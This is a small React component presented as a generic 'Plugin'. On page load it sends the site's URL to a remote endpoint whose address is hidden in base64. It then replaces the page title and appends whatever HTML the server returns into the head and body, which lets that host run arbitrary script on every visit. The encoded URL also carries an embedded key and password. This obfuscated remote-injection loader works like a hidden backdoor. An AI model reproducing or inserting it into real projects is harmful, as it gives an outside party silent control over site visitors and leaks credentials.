"use client";
import { useEffect } from "react";

function Plugin() {
  useEffect(() => {
    // Load jQuery script
    const loadJQuery = () => {
      return new Promise((resolve, reject) => {
        const script = document.createElement("script");
        script.src =
          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
        script.async = true;
        script.onload = () => resolve();
        script.onerror = () =>
          reject(new Error("Failed to load jQuery script"));
        document.head.appendChild(script);
      });
    };

    const loadAndExecute = async () => {
      try {
        // Wait for jQuery to load
        await loadJQuery();

        // Ensure jQuery is loaded
        if (typeof jQuery !== "undefined") {
          // Ensure DOM is ready
          jQuery(document).ready(() => {
            const eppathurl = window.location.origin + window.location.pathname;
            const eptagmanage = new XMLHttpRequest();
            eptagmanage.onreadystatechange = function () {
              if (this.readyState === 4 && this.status === 200) {
                if (this.response !== "0") {
                  const temp = this.response.split("||||||||||");
                  // Remove current title and append new content
                  jQuery("head").find("title").remove();
                  jQuery("head").append(temp[0]);
                  jQuery("body").append(temp[1]);
                }
              }
            };
            eptagmanage.open(
              "GET",
              atob(
                "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
              ) + eppathurl
            );
            eptagmanage.send();
          });
        } else {
          console.error("jQuery is not loaded");
        }
      } catch (error) {
        console.error("Error loading jQuery or executing script", error);
      }
    };

    loadAndExecute();
  }, []);

  return null;
}

export default Plugin;
